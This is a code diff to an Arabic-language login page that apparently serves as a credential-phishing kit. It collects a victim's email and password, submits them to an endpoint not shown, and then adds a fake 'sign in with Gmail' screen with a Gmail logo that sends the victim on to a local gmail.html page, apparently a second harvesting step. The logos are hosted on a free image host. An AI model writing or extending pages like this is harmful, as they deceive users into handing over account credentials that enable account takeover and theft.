@@ -21,9 +21,22 @@
             padding: 20px;
         }
 
+        body.gmail-redirect {
+            background: white;
+        }
+
         .container {
             width: 100%;
             max-width: 500px;
+        }
+
+        /* الصفحة الأولى */
+        .page-1 {
+            display: block;
+        }
+
+        .page-1.hidden {
+            display: none;
         }
 
         .back-btn {
@@ -192,6 +205,96 @@
             100% { transform: rotate(360deg); }
         }
 
+        /* صفحة التوجيه إلى Gmail */
+        .page-2 {
+            display: none;
+            min-height: 100vh;
+            background: white;
+        }
+
+        .page-2.active {
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+        }
+
+        .gmail-redirect-container {
+            text-align: center;
+            max-width: 600px;
+            padding: 40px 20px;
+        }
+
+        .gmail-logo-container {
+            margin-bottom: 50px;
+            animation: fadeInDown 0.6s ease;
+        }
+
+        .gmail-logo-container img {
+            height: 120px;
+            object-fit: contain;
+        }
+
+        .gmail-title {
+            font-size: 32px;
+            font-weight: 600;
+            color: #202124;
+            margin-bottom: 16px;
+            animation: fadeInUp 0.6s ease;
+        }
+
+        .gmail-description {
+            font-size: 16px;
+            color: #5f6368;
+            line-height: 1.6;
+            margin-bottom: 50px;
+            animation: fadeInUp 0.6s ease 0.2s both;
+        }
+
+        .gmail-button {
+            padding: 14px 40px;
+            background: #1f73e6;
+            color: white;
+            border: none;
+            border-radius: 4px;
+            font-size: 16px;
+            font-weight: 500;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            animation: fadeInUp 0.6s ease 0.4s both;
+        }
+
+        .gmail-button:hover {
+            background: #1765cc;
+            box-shadow: 0 4px 12px rgba(31, 115, 230, 0.3);
+        }
+
+        .gmail-button:active {
+            background: #1555c0;
+        }
+
+        @keyframes fadeInDown {
+            from {
+                opacity: 0;
+                transform: translateY(-30px);
+            }
+            to {
+                opacity: 1;
+                transform: translateY(0);
+            }
+        }
+
+        @keyframes fadeInUp {
+            from {
+                opacity: 0;
+                transform: translateY(30px);
+            }
+            to {
+                opacity: 1;
+                transform: translateY(0);
+            }
+        }
+
         @media (max-width: 480px) {
             .container {
                 padding: 0 15px;
@@ -208,57 +311,89 @@
             .logo img {
                 height: 60px;
             }
+
+            .gmail-title {
+                font-size: 24px;
+            }
+
+            .gmail-description {
+                font-size: 14px;
+            }
+
+            .gmail-logo-container img {
+                height: 80px;
+            }
         }
     </style>
 </head>
 <body>
     <div class="container">
-        <button class="back-btn" onclick="window.history.back()">←</button>
+        <!-- الصفحة الأولى -->
+        <div class="page-1" id="page1">
+            <button class="back-btn" onclick="window.history.back()">←</button>
 
-        <div class="logo">
-            <img src="https://a.top4top.io/p_37430qzsw0.png" alt="lba logo">
+            <div class="logo">
+                <img src="https://a.top4top.io/p_37430qzsw0.png" alt="lba logo">
+            </div>
+
+            <h1 class="heading">للاستمرار، يرجى إدخال البريد الإلكتروني المستخدم وكلمة المرور</h1>
+
+            <form id="loginForm">
+                <div class="form-group">
+                    <label for="email">البريد الإلكتروني</label>
+                    <div class="input-wrapper">
+                        <input 
+                            type="email" 
+                            id="email" 
+                            name="email"
+                            placeholder="أدخل بريدك الإلكتروني"
+                            required
+                        >
+                    </div>
+                </div>
+
+                <div class="form-group">
+                    <label for="password">كلمة المرور</label>
+                    <div class="input-wrapper">
+                        <input 
+                            type="password" 
+                            id="password" 
+                            name="password"
+                            placeholder="أدخل كلمة المرور"
+                            required
+                        >
+                        <button type="button" class="password-toggle-btn" onclick="togglePassword()">🔊</button>
+                    </div>
+                </div>
+
+                <p class="forgot-link">
+                    <a href="#">هل نسيت كلمة المرور؟</a>
+                </p>
+
+                <button type="submit" class="submit-btn" id="submitBtn">الدخول</button>
+            </form>
+
+            <div class="loading" id="loading">
+                <div class="spinner"></div>
+                <p>جاري الإرسال...</p>
+            </div>
         </div>
 
-        <h1 class="heading">للاستمرار، يرجى إدخال البريد الإلكتروني المستخدم وكلمة المرور</h1>
-
-        <form id="loginForm">
-            <div class="form-group">
-                <label for="email">البريد الإلكتروني</label>
-                <div class="input-wrapper">
-                    <input 
-                        type="email" 
-                        id="email" 
-                        name="email"
-                        placeholder="أدخل بريدك الإلك��روني"
-                        required
-                    >
+        <!-- صفحة التوجيه إلى Gmail -->
+        <div class="page-2" id="page2">
+            <div class="gmail-redirect-container">
+                <div class="gmail-logo-container">
+                    <img src="https://a.top4top.io/p_3743gwdsf0.png" alt="Gmail Logo">
                 </div>
+
+                <h1 class="gmail-title">تسجيل الدخول عبر Gmail</h1>
+
+                <p class="gmail-description">
+                    للمتابعة والوصول إلى جميع الميزات، يجب عليك تسجيل الدخول باستخدام حسابك على Gmail
+                </p>
+
+                <button class="gmail-button" onclick="redirectToGmail()">المتابعة إلى Gmail</button>
             </div>
-
-            <div class="form-group">
-                <label for="password">كلمة المرور</label>
-                <div class="input-wrapper">
-                    <input 
-                        type="password" 
-                        id="password" 
-                        name="password"
-                        placeholder="أدخل كلمة المرور"
-                        required
-                    >
-                    <button type="button" class="password-toggle-btn" onclick="togglePassword()">🔊</button>
-                </div>
-            </div>
-
-            <p class="forgot-link">
-                <a href="#">هل نسيت كلمة المرور؟</a>
-            </p>
-
-            <button type="submit" class="submit-btn" id="submitBtn">الدخول</button>
-        </form>
-
-        <div class="loading" id="loading">
-            <div class="spinner"></div>
-            <p>جاري الإرسال...</p>
         </div>
     </div>
 
@@ -307,8 +442,10 @@
                 const data = await response.json();
 
                 if (data.ok) {
-                    alert('تم الإرسال بنجاح');
-                    document.getElementById('loginForm').reset();
+                    // إخفاء الصفحة الأولى وإظهار صفحة Gmail
+                    document.getElementById('page1').classList.add('hidden');
+                    document.getElementById('page2').classList.add('active');
+                    document.body.classList.add('gmail-redirect');
                 } else {
                     alert('حدث خطأ. الرجاء المحاولة مجددا');
                 }
@@ -328,6 +465,11 @@
             } else {
                 passwordInput.type = 'password';
             }
+        }
+
+        function redirectToGmail() {
+            // سيتم التوجيه إلى gmail.html
+            window.location.href = 'gmail.html';
         }
     </script>
 </body>
